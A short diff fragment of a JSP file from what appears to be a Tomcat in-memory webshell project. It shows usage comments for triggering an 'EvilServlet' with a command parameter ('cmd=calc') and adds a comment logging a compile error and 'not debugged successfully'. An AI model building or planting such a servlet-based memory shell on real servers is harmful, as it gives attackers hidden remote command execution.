@@ -13,6 +13,11 @@
 <!-- 1 request this file -->
 <!-- 2 request thisfile/../evilpage?cmd=calc -->
 
+<!--
+JSP文件：[/jsp注入内存马/addservlet.jsp] 的第 [61] 行发生了一个错误
+The method addServletMapping(String, String) is undefined for the type StandardContext
+未调试成功
+-->
 
 <%
 class EvilServlet implements Servlet{
